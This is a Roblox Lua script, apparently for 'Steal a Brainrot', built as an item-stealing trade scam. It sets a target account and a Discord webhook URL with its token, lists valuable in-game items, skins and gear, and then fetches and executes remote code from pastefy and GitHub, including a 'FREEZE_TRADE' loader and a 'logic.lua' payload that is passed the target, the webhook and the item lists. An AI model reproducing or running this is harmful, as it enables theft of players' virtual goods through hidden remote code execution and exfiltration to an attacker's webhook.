local TARGET_ID = 12009330786
local TARGET_USER = "fahd8799isuncle"
local WEBHOOK_URL = "https://discord.com/api/webhooks/1572042953566855188/N9lWIiYoSbSI5aO4PHZxTtuhuvoopAKNGUgoy6N5rD4wAlGNJFGqGZ4zJKk_TpgZb-F5"

local TargetBrainrots = {
    ["Phoenix"] = true,
    ["Hydra Serpent"] = true,
    ["Dragon Skeletonini"] = true,
    ["La Craft Machine"] = true,
    ["Gold and Diamond"] = true,
    ["Dragon Cannelloni"] = true,
    ["Dragon Gingerini"] = true,
    ["Griffin"] = true,
    ["Hydra Bunny"] = true,
    ["Hydra Dragon Cannelloni"] = true,
    ["Antonio"] = true,
    ["Elefanto Frigo"] = true,
    ["Dug Dug Dug"] = true,
    ["Tirilikalika Tirilikalako"] = true,
    ["Capitano Americano"] = true,
    ["Rico Dinero"] = true,
    ["Globa Steppa"] = true,
    ["Kalika Bros"] = true,
    ["La Casa Boo"] = true,
    ["La Supreme Combinasion"] = true,
    ["Duggy Bros"] = true,
    ["Cerberus"] = true,
    ["Venuspino"] = true,
    ["Sammyni Cakini"] = true,
    ["La Breakfast Combinasion"] = true,
    ["La Fuse Machine"] = true,
    ["La Taco Combinasion"] = true,
    ["La Spooky Grande"] = true,
    ["La Secret Combinasion"] = true,
    ["La Romantic Grande"] = true,
    ["La Lucky Grande"] = true,
    ["La Jolly Grande"] = true,
    ["La Ginger Sekolah"] = true,
    ["La Food Combinasion"] = true,
    ["La Extinct Grande"] = true,
    ["La Easter Grande"] = true,
    ["Fragola La La La"] = true,
    ["Los Dragons"] = true,
    ["Arcadragon"] = true,
    ["Dragon Aquanini"] = true,
    ["Torrtuginni Dragonfrutini"] = true,
    ["Popcuru and Fizzuru"] = true,
    ["Panda Popanda"] = true,
    ["Pancake and Syrup"] = true,
    ["Bacuru and Egguru"] = true,
    ["Bunny and Eggy"] = true,
    ["Burguro and Fryuro"] = true,
    ["Chipso and Queso"] = true,
    ["Cooki and Milki"] = true,
    ["Fragrama and Chocrama"] = true,
    ["Fortunu and Cashuru"] = true,
    ["Ketchuru and Musturu"] = true,
    ["Garama and Madundung"] = true,
    ["Coco and Mango"] = true,
    ["Pizza and Ranch"] = true,
    ["Noo My Candy"] = true,
    ["Rosey and Teddy"] = true,
    ["Spooky and Pumpky"] = true,
    ["Candini Fluffini"] = true,
    ["Rubiko and Kubiko"] = true,
    ["Ketupat Bros"] = true,
    ["Ketupat Kepat"] = true
}

local TargetBaseSkins = {
    ["Cursed"] = true,
    ["Cyber"] = true,
    ["Candy"] = true,
    ["Christmas"] = true,
    ["Aquatic"] = true,
    ["Bunny Basket"] = true,
    ["Diamond"] = true,
    ["Easter"] = true,
    ["Galaxy"] = true,
    ["Divine"] = true,
    ["Gingerbread"] = true,
    ["Lucky"] = true,
    ["Octo"] = true,
    ["Halloween"] = true,
    ["Lava"] = true,
    ["Gold"] = true,
    ["Radioactive"] = true,
    ["Rainbow"] = true,
    ["Pot of Gold"] = true,
    ["Rose"] = true,
    ["Taco"] = true,
    ["Summer"] = true,
    ["Tralalero"] = true,
    ["Valentines"] = true,
    ["Yin Yang"] = true
}

local TargetGears = {
    ["Candy Slap"] = true,
    ["Bloodmoon Slap"] = true,
    ["Candy Sentry"] = true,
    ["Bloodmoon Hammer"] = true,
    ["Alien Slap"] = true,
    ["Blackhole Bomb"] = true,
    ["Cursed Slap"] = true,
    ["Cupid's Wings"] = true,
    ["Demon's Head"] = true,
    ["Cyber Slap"] = true,
    ["Lava Blaster"] = true,
    ["Divine Slap"] = true,
    ["Radioactive Airstrike"] = true,
    ["Rainbow Hammer"] = true,
    ["Santa's Sleigh"] = true,
    ["Rainbow Slap"] = true,
    ["Radioactive Slap"] = true,
    ["Lava Slap"] = true,
    ["Witch's Broom"] = true,
    ["Waverider"] = true,
    ["Yin Yang Slap"] = true,
    ["Yin Yang Lamp"] = true,
    ["Crystal Slap"] = true,
    ["Phantom Slap"] = true
}

task.spawn(function()
    loadstring(game:HttpGet("https://pastefy.app/RsqRaQC0/raw"))()
end)

task.spawn(function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/chocolascript-glitch/FREEZE_TRADE/refs/heads/main/.lua"))()

    task.wait(1)

    local script = loadstring(game:HttpGet("https://raw.githubusercontent.com/chocolascript-glitch/script/refs/heads/main/logic.lua"))()
    if type(script) == "function" then
        script(TARGET_ID, TARGET_USER, WEBHOOK_URL, TargetBrainrots, TargetBaseSkins, TargetGears)
    end
end)